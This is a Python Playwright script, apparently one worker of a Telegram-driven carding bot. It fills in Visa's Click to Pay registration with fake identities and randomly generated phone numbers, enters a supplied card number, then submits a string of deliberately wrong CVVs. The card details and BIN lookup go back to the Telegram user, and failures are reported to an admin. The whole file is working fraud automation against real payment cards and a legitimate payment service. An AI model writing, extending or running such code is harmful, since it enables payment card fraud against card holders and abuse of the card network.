import asyncio
import random
import time
import traceback

from playwright.async_api import BrowserContext
from worker.utils import get_fake_identity, get_wrong_cvv, split_card, get_bin_info, tg_edit, tg_admin_screenshot

TIMEOUT = 6000


async def run(ctx: BrowserContext, card_input: str, chat_id: int, message_id: int) -> bool:
    page = await ctx.new_page()
    start = time.time()
    try:
        cc, mm, yy, real_cvv = split_card(card_input)
        identity = get_fake_identity()
        wrong_cvv = get_wrong_cvv(real_cvv)
        short_card = f"{cc}|{mm}|{yy}|{real_cvv}"

        bin_task = asyncio.create_task(get_bin_info(cc[:6]))

        await tg_edit(chat_id, message_id, "⚙️ Processing your request...")
        await page.goto("https://src.visa.com/login", wait_until="domcontentloaded", timeout=20000)

        # Cookie banner
        try:
            await page.wait_for_selector("a.wscrOk", timeout=2500)
            await page.click("a.wscrOk")
        except Exception:
            pass

        # STEP 1 — Email
        await page.wait_for_selector("#email-input", state="visible", timeout=TIMEOUT)
        await page.fill("#email-input", identity["email"])
        await page.click("xpath=//button[normalize-space(.)='Continue']")

        # Phone
        await page.wait_for_selector("#login-phone-input-number", state="visible", timeout=TIMEOUT)
        phone = (
            random.choice(["201", "202", "203", "205", "206", "207", "208", "209"])
            + random.choice(["201", "202", "303", "404", "505", "606"])
            + "".join(random.choices("0123456789", k=4))
        )
        await page.fill("#login-phone-input-number", phone)
        await page.evaluate("() => { const cb = document.querySelector('input.v-checkbox[type=\"checkbox\"]'); if(cb && !cb.checked) cb.click(); }")
        await page.click("xpath=//button[normalize-space(.)='Next']")

        # STEP 2 — Card info
        await page.wait_for_selector("#card-input", state="visible", timeout=TIMEOUT)
        await page.fill("#first-name-input", identity["first_name"])
        await page.fill("#last-name-input", identity["last_name"])
        await page.click("#card-input", click_count=3)
        await page.fill("#card-input", cc)
        await page.fill("#expiration-input", mm + yy)
        await page.fill("#cvv-input", wrong_cvv)

        # STEP 3 — Address
        await page.wait_for_selector("#line1-input", state="visible", timeout=TIMEOUT)
        try:
            country_val = await page.input_value('[data-testid="region-select"]')
            if "United States" not in country_val:
                await page.click('[data-testid="region-select"]')
                await page.fill('[data-testid="region-select"]', "United States")
                await page.keyboard.press("Enter")
        except Exception:
            pass
        await page.fill("#line1-input", identity["address"])
        await page.fill("#city-input", identity["city"])
        await page.fill("#stateProvinceCode-input", identity["state"])
        await page.fill("#zip-input", identity["zip"])

        await page.wait_for_selector("xpath=//div[normalize-space(text())='Add card']", state="visible", timeout=TIMEOUT)
        await page.click("xpath=//div[normalize-space(text())='Add card']")

        # STEP 4 — CVV loop (no tg_edit pause)
        used = {wrong_cvv}
        for _ in range(5):
            fake = get_wrong_cvv(real_cvv)
            while fake in used:
                fake = get_wrong_cvv(real_cvv)
            used.add(fake)
            try:
                await page.wait_for_selector("#cvv-input", state="visible", timeout=TIMEOUT)
                await page.click("#cvv-input", click_count=3)
                await page.fill("#cvv-input", fake)
                await page.click("xpath=//div[normalize-space(text())='Add card']")
                await page.wait_for_timeout(120)
            except Exception:
                pass

        bin_info, bin_flag = await bin_task
        await tg_edit(
            chat_id, message_id,
            f"💳 **Card:** `{short_card}`\n"
            f"🏦 **BIN:** `{bin_info}` {bin_flag}\n\n"
            f"1 Procceed\n2 Processed\n\n"
            f"🚀 **Status:** ZZ Optimized Success\n"
            f"⏱ **Time:** {round(time.time() - start, 2)}s"
        )
        return True

    except Exception:
        trace = traceback.format_exc()
        await tg_edit(chat_id, message_id, "❌ Request timeout, try again.")
        try:
            screenshot = await page.screenshot()
            await tg_admin_screenshot("zz", trace, screenshot)
        except Exception:
            await tg_admin_screenshot("zz", trace, None)
        return False
    finally:
        await page.close()
